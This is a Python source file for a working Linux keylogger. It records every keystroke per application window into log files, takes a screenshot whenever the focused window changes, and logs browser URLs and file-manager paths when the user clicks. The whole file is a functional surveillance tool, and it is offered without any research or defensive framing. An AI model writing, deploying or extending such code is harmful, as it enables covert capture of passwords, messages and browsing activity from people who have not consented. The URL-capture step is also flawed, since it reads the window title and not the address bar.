import os
import subprocess
import time
from datetime import datetime
import pyautogui
import threading
import pyxhook
from pynput.mouse import Listener

# Function to get the active window title
def get_active_window_title():
    try:
        window_title = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname']).decode('utf-8').strip()
        return window_title
    except Exception as e:
        print(f"Error getting active window title: {e}")
        return "Unknown"

# Base directory for logs
base_log_dir = os.path.expanduser('/home/nothing/Desktop/keylogger_logs')

# Ensure the base directory for the log files exists
if not os.path.exists(base_log_dir):
    os.makedirs(base_log_dir)

# Variable to keep track of the last active window title
last_active_window_title = None

# A dictionary to store the current word being typed for each app/tab
current_word = {}

# Function to track active window changes
def track_active_window():
    global last_active_window_title

    while True:
        active_window_title = get_active_window_title()
        
        if active_window_title != last_active_window_title:
            last_active_window_title = active_window_title
            sanitized_title = "".join(c for c in active_window_title if c.isalnum() or c in (' ', '_')).strip()
            app_folder = os.path.join(base_log_dir, sanitized_title)
            
            # Only create the folder if it doesn't already exist
            if not os.path.exists(app_folder):
                os.makedirs(app_folder)

            print(f"Switching to new app: {active_window_title}")
            # Take a screenshot when switching to a new window/tab
            take_screenshot(app_folder)
        
        time.sleep(1)  # Check every second for a window switch

# Function to take a screenshot of the screen
def take_screenshot(app_folder):
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    screenshot_path = os.path.join(app_folder, f"screenshot_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    print(f"Screenshot saved: {screenshot_path}")

# Start a separate thread to track active window changes
window_tracking_thread = threading.Thread(target=track_active_window, daemon=True)
window_tracking_thread.start()

# Function to detect mouse clicks and log URLs or file paths
def on_click(x, y, button, pressed):
    if pressed:
        # Get the active window title
        active_window_title = get_active_window_title()
        sanitized_title = "".join(c for c in active_window_title if c.isalnum() or c in (' ', '_')).strip()
        app_folder = os.path.join(base_log_dir, sanitized_title)

        # Ensure the folder exists for logging
        if not os.path.exists(app_folder):
            os.makedirs(app_folder)

        # Check if the active window is a browser (for URL capture)
        if 'firefox' in active_window_title.lower() or 'chrome' in active_window_title.lower() or 'opera' in active_window_title.lower():
            # Simulate pressing 'Ctrl + L' to get the URL in the browser
            subprocess.call(["xdotool", "key", "ctrl+l"])  # Focus the URL bar

            # Get the URL from the browser's active window
            try:
                active_url = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname']).decode('utf-8').strip()
                if active_url.startswith("http"):
                    log_url(app_folder, active_url)
            except Exception as e:
                print(f"Error getting URL: {e}")

        # Check if the active window is a file manager (for file/folder path capture)
        elif 'file' in active_window_title.lower() or 'explorer' in active_window_title.lower():
            # Capture the file or folder path
            log_path(app_folder, active_window_title)

def log_url(app_folder, url):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_file = os.path.join(app_folder, f"{os.path.basename(app_folder)}.log")
    with open(log_file, 'a') as file:
        file.write(f"[{timestamp}] URL: {url}\n")
    print(f"URL logged: {url}")

def log_path(app_folder, path):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_file = os.path.join(app_folder, f"{os.path.basename(app_folder)}.log")
    with open(log_file, 'a') as file:
        file.write(f"[{timestamp}] Path: {path}\n")
    print(f"Path logged: {path}")

# Create a hook manager object to listen for key events
new_hook = pyxhook.HookManager()

# Function to handle keypress events
def OnKeyPress(event):
    global current_word

    # Ignore Shift key presses alone
    if event.Key == 'Shift_L' or event.Key == 'Shift_R':
        return

    # Get the active window title
    active_window_title = get_active_window_title()
    sanitized_title = "".join(c for c in active_window_title if c.isalnum() or c in (' ', '_')).strip()
    app_folder = os.path.join(base_log_dir, sanitized_title)

    # Ensure the folder exists for logging
    if not os.path.exists(app_folder):
        os.makedirs(app_folder)

    # Track current word for the active app/tab
    if sanitized_title not in current_word:
        current_word[sanitized_title] = ""

    # Process key press
    if event.Ascii == 32:  # Space key (ASCII 32)
        current_word[sanitized_title] += " "  # Add a space
    elif event.Ascii == 13:  # Enter key (ASCII 13)
        # When Enter is pressed, finalize the word and log it
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(os.path.join(app_folder, f"{sanitized_title}.log"), 'a') as log_file:
            log_file.write(f"[{timestamp}] [{active_window_title}] {current_word[sanitized_title]} Enter\n")
        current_word[sanitized_title] = ""  # Reset the current word after pressing Enter
    else:
        # Append the key character to the current word
        current_word[sanitized_title] += event.Key

# Create a hook for capturing key events
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()

# Start listening for mouse events
mouse_listener = Listener(on_click=on_click)
mouse_listener.start()

try:
    # Start the keylogger and window tracking
    print("Keylogger started. Press Ctrl+C to stop.")
    new_hook.start()  # Start keylogging
except KeyboardInterrupt:
    # User manually stopped the keylogger with Ctrl+C
    print("\nKeylogger stopped by user.")
except Exception as ex:
    # Log any errors that occur during execution
    msg = f'Error while catching events: {ex}'
    print(msg)
    with open(os.path.join(base_log_dir, 'error.log'), 'a') as f:
        f.write(f'\n{msg}')  # Write error message to log file
finally:
    # Clean up the hook when done
    new_hook.unhook()
    mouse_listener.stop()
    print("Keylogger unhooked and cleaned up.")
